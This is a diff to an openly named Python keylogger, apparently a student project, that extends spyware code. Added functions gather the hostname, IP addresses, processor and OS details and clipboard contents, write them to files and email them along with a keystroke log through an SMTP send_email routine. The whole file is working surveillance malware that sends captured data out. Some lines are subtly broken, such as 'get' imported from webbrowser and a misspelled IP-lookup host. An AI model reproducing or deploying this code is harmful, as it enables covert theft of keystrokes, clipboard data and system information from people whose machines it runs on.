@@ -9,28 +9,21 @@ import smtplib
 #comp info
 import socket
 import platform
-#from requests import get
 #get user Name
 import getpass
-#microphone
-#import sounddevice as sd
-#from scipy.io.wavfile import write
+from webbrowser import get
 #clipboard
 import win32clipboard
-#image
-#import pyscreenshot as ImageGrab
 #keystrokes listener
 from pynput.keyboard import Key, Listener
 from pynput import keyboard
-# tracking time
-import time
-import os
-#file encryption
-#from cryptography.fernet import fernet
+
 
 #creating file to store log and file path
 keys_information ="key_log.txt"
 file_path = "C:\\Users\\Netsi\\Desktop\\YN\\hilcoe\\Github\\keylogger-updated-"
+system_information="systeminfo.txt"
+clipboard_information="clipboardinfo.txt"
 #allows to add an extention to access keylog.txt file
 extend ="\\"
 
@@ -105,3 +98,39 @@ def send_email(filename,attachment,toaddr):
     s.sendmail(fromaddr,toaddr,text)
     s.quit()
 send_email(keys_information,file_path+extend+keys_information,toaddr)
+
+# Get Computer and Network Information
+def computer_information():
+    with open(file_path + extend+ system_information, "a") as f:
+        hostname = socket.gethostname()
+        IPAddr = socket.gethostbyname(hostname)
+        try:
+            public_ip= get("https://api.apify.org").text
+            f.write("public IP Address: "+ public_ip)
+        except Exception:
+            f.write("couldn't get public ip")
+        
+        f.write("Processor: " + (platform.processor() + "\n"))
+        f.write("System: " + platform.system() + " " + platform.version() + "\n")
+        f.write("Machine: " + platform.machine() + "\n")
+        f.write("Hostname: " + hostname + "\n")
+        f.write("Private IP Address: " + IPAddr + "\n")
+
+computer_information()
+send_email(system_information, file_path + extend + system_information,toaddr)
+
+# Gather clipboard contents
+def copy_clipboard():
+    with open(file_path + extend + clipboard_information, "a") as f:
+        try:
+            win32clipboard.OpenClipboard()
+            pasted_data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+
+            f.write("Clipboard Data: \n" + pasted_data)
+
+        except:
+            f.write("Clipboard could not be copied.")
+
+copy_clipboard()
+send_email(clipboard_information, file_path + extend + clipboard_information,toaddr)
